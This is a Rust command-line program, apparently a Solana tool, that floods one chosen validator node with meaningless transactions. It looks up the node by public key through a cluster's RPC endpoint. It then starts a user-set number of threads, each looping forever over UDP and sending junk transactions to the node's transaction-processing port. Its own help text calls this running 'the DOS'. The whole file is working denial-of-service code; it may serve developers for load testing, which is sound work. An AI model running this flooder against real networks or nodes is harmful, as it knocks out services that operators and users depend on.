extern crate log;
use clap::{crate_description, crate_name, value_t, App, Arg};
use rand::thread_rng;
use solana_client::{rpc_client::RpcClient, thin_client::ThinClient};
use solana_sdk::{
    client::AsyncClient, hash::Hash, pubkey::Pubkey, signature::Keypair, transaction::Transaction,
};
use std::{
    net::UdpSocket,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc,
    },
    thread::spawn,
};

fn main() {
    solana_logger::setup();

    let matches = App::new(crate_name!())
        .about(crate_description!())
        .version(solana_version::version!())
        .arg(
            Arg::with_name("cluster_url")
                .long("cluster_url")
                .takes_value(true)
                .value_name("URL")
                .help("Cluster to hit!")
                .required(true),
        )
        .arg(
            Arg::with_name("target_key")
                .long("target_key")
                .takes_value(true)
                .value_name("PUBKEY")
                .help("Node to hit!")
                .required(true),
        )
        .arg(
            Arg::with_name("num_threads")
                .long("num_threads")
                .takes_value(true)
                .value_name("NUM_THREADS")
                .help("Number of threads to run the DOS!")
                .required(true),
        )
        .get_matches();

    let url = value_t!(matches, "cluster_url", String).unwrap();
    let rpc_client = RpcClient::new(url);
    let target_key = value_t!(matches, "target_key", String).unwrap();
    let nodes = rpc_client.get_cluster_nodes().unwrap();
    let node = Arc::new(nodes.into_iter().find(|n| n.pubkey == target_key).unwrap());
    println!("node = {:?}", node);

    let thread_count = value_t!(matches, "num_threads", u32).unwrap();
    let keypair = Arc::new(Keypair::generate(&mut thread_rng()));
    let key = Pubkey::new_unique();

    let mut threads = Vec::new();
    let counter = Arc::new(AtomicUsize::new(0));
    for i in 0..thread_count {
        let counter = Arc::clone(&counter);
        let node = Arc::clone(&node);
        let keypair = keypair.clone();
        threads.push(spawn(move || {
            println!("binding: 0.0.0.0:{}", 50000 + i);
            let client = ThinClient::new(
                node.rpc.unwrap(),
                node.tpu.unwrap(),
                UdpSocket::bind(format!("0.0.0.0:{}", 50000 + i)).unwrap(),
            );

            loop {
                let transaction = Transaction::new_with_compiled_instructions(
                    &[keypair.as_ref()],
                    &[],
                    Hash::new(&[0; 32]),
                    vec![key],
                    vec![],
                );
                let _ = client.async_send_transaction(transaction).unwrap();
                if counter.fetch_add(1, Ordering::Relaxed) % 0x1000 == 0 {
                    println!("sent {}", counter.load(Ordering::Relaxed));
                }
            }
        }));
    }

    for thread in threads {
        thread.join().unwrap();
    }
}